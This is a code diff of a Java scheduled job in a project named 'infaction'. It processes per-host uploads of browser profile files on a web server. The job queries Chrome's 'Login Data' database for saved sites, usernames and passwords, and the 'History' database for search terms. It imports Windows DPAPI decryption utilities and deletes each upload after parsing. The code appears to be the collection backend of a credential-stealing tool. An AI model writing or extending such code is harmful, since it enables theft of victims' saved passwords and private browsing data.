@@ -2,10 +2,7 @@ package com.jimmy.infaction.job;
 
 import com.jimmy.infaction.common.*;
 import com.jimmy.infaction.pojo.*;
-import com.jimmy.infaction.service.BrowserDownloadService;
-import com.jimmy.infaction.service.BrowserKeywordService;
-import com.jimmy.infaction.service.BrowserService;
-import com.jimmy.infaction.service.BrowserUrlService;
+import com.jimmy.infaction.service.*;
 import com.sun.jna.platform.win32.Crypt32Util;
 import org.quartz.Job;
 import org.quartz.JobExecutionContext;
@@ -36,22 +33,27 @@ public class DeBagJob  implements  Job {
 			e.printStackTrace();
 		}
 		//find xml register beanservice
+		BrowserFailService browserFailService = (BrowserFailService) applicationContext.getBean("browserFailService");
 		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
 		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
 		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
 		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
-		String rootPath = "F:\\workspace\\infaction\\upload\\";
+//		String rootPath = "F:\\workspace\\infaction\\upload\\";
+		String rootPath = "/opt/tomcat/webapps/ROOT/upload/";
 		File dir = new File(rootPath);
 		File[] files = dir.listFiles();
 		for (File f : files) {
-			//todo need to check mysql browser_faild  hostid
+			//need to check mysql browser_faild  hostid if submit again clear the faild record
 			if (!(f.getName().matches(".*.zip"))) {
+				if (browserFailService.CheckHostBag(((String)f.getName()).trim()) > 0){
+					browserFailService.deleteExitsBag(((String)f.getName()).trim());
+				}
 				for (File ff : f.listFiles()) {
 					int num = 10; //初始线程数
 					try {
 						switch (ff.getName()){
 							case "Login Data":
-								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
+								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"/"+"Login Data");
 								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
 								int Llength = LoginList.size();
 								int LbaseNum = Llength / num;
@@ -71,7 +73,7 @@ public class DeBagJob  implements  Job {
 								}
 								break;
 							case "History":
-								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
+								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
 								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
 								int klength = HkList.size();
 								int kbaseNum = klength / num;
@@ -131,7 +133,7 @@ public class DeBagJob  implements  Job {
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
-//					ff.delete();
+					f.delete();
 				}
 			}
 		}
